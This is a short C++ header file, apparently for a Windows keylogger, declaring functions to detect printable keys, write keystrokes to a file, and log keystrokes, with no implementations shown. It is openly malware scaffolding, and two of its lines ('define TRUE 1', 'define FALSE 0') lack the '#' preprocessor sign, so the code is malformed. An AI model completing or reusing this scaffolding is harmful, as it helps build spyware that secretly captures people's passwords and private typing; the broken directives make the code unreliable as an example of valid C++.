#ifndef KEYLOGGER__HPP
#define KEYLOGGER__HPP


#include <winuser.h>
#include <winbase.h>
#include <fstream>
#include <iostream>
#include <psapi.h>
#include <string>

define TRUE 1
define FALSE 0

BOOL __is_printable_key(int key);
void __ft_writeTofile(int key);
int __keyStrokeslogger(int ac, char **av);


#endif